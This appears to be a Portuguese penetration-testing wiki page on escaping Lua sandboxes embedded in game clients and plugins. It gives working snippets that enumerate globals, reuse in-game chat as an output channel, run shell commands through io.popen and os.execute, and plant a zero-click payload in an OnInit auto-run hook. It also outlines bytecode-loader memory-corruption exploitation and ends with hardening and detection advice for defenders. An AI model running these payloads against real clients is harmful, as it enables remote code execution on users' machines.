# Bypass de sandboxes Lua (VMs incorporadas, clientes de jogos)

{{#include ../../../banners/hacktricks-training.md}}

Esta página reúne técnicas práticas para enumerar e escapar de "sandboxes" Lua incorporadas em aplicações (principalmente clientes de jogos, plugins ou engines de scripting dentro de aplicações). Muitas engines expõem um ambiente Lua restrito, mas deixam globais poderosos acessíveis, permitindo a execução arbitrária de comandos ou até mesmo corrupção de memória nativa quando carregadores de bytecode estão expostos.

Ideias principais:
- Trate a VM como um ambiente desconhecido: enumere _G e descubra quais primitivas perigosas estão acessíveis.
- Quando stdout/print estiver bloqueado, abuse de qualquer canal de UI/IPC dentro da VM como um sink de saída para observar os resultados.
- Se io/os estiver exposto, geralmente você terá execução direta de comandos (io.popen, os.execute).
- Se load/loadstring/loadfile estiverem expostos, executar bytecode Lua criado especificamente pode subverter a segurança de memória em algumas versões (os verificadores da ≤5.1 podem ser contornados; a 5.2 removeu o verificador), permitindo exploração avançada.

## Enumerar o ambiente em sandbox

- Despeje o ambiente global para inventariar tabelas/funções acessíveis:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se nenhuma função print() estiver disponível, reutilize canais dentro da VM. Exemplo de uma VM de script de habitação de um MMO em que a saída do chat só funciona após uma chamada de som; o código a seguir cria uma função de saída confiável:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalize este padrão para o seu alvo: qualquer textbox, toast, logger ou callback de UI que aceite strings pode atuar como stdout para reconnaissance.

## Execução direta de comandos se io/os estiver exposto

Se o sandbox ainda expõe as bibliotecas padrão io ou os, é provável que você tenha execução imediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:

- A execução ocorre dentro do processo do cliente; muitas camadas anti-cheat/antidebug que bloqueiam depuradores externos não impedirão a criação de processos in-VM.
- Verifique também: package.loadlib (carregamento arbitrário de DLL/.so), require com módulos nativos, o ffi do LuaJIT (se presente) e a biblioteca debug (pode elevar privilégios dentro da VM).

## Gatilhos zero-click via callbacks auto-run

Se o aplicativo host enviar scripts aos clientes e a VM expuser hooks auto-run (por exemplo, OnInit/OnLoad/OnEnter), coloque seu payload nesse local para obter comprometimento drive-by assim que o script for carregado:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualquer callback equivalente (OnLoad, OnEnter etc.) generaliza esta técnica quando os scripts são transmitidos e executados automaticamente no cliente.

## Primitivas perigosas a procurar durante o recon

Durante a enumeração de _G, procure especificamente por:
- io, os: io.popen, os.execute, file I/O, acesso ao env.
- load, loadstring, loadfile, dofile: executam source ou bytecode; oferecem suporte ao carregamento de bytecode não confiável.
- package, package.loadlib, require: carregamento de bibliotecas dinâmicas e superfície de módulos.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo e hooks.
- Exclusivo do LuaJIT: ffi.cdef, ffi.load para chamar código nativo diretamente.

Exemplos mínimos de uso (se acessíveis):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalonamento opcional: abusando de carregadores de bytecode Lua

Quando load/loadstring/loadfile estão acessíveis, mas io/os são restritos, a execução de bytecode Lua criado pode levar a primitivas de divulgação e corrupção de memória. Fatos importantes:
- Lua ≤ 5.1 incluía um verificador de bytecode com bypasses conhecidos.<sup>[[4]](#references)</sup>
- Lua 5.2 removeu completamente o verificador (posição oficial: as aplicações devem simplesmente rejeitar chunks pré-compilados), ampliando a superfície de ataque caso o carregamento de bytecode não seja proibido.<sup>[[2]](#references)[[3]](#references)</sup>
- Os fluxos normalmente envolvem: vazar ponteiros por meio da saída da VM, criar bytecode para gerar confusões de tipo (por exemplo, em torno de FORLOOP ou de outros opcodes) e, então, obter leitura/escrita arbitrária ou execução de código nativo.<sup>[[2]](#references)[[4]](#references)</sup>

Esse caminho é específico do engine/versão e requer RE. Consulte as referências para análises aprofundadas, primitivas de exploração e exemplos de gadgets em jogos.

## Notas de detecção e hardening (para defensores)

- Lado do servidor: rejeite ou reescreva scripts de usuários; use uma allowlist de APIs seguras; remova ou deixe vazios io, os, load/loadstring/loadfile/dofile, package.loadlib, debug e ffi.
- Lado do cliente: execute Lua com um _ENV mínimo, proíba o carregamento de bytecode, reintroduza um verificador rigoroso de bytecode ou verificações de assinatura e bloqueie a criação de processos a partir do processo do cliente.
- Telemetria: alerte sobre a criação de processos-filhos por gameclient logo após o carregamento de um script; correlacione com eventos de UI/chat/script.

## Referências

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
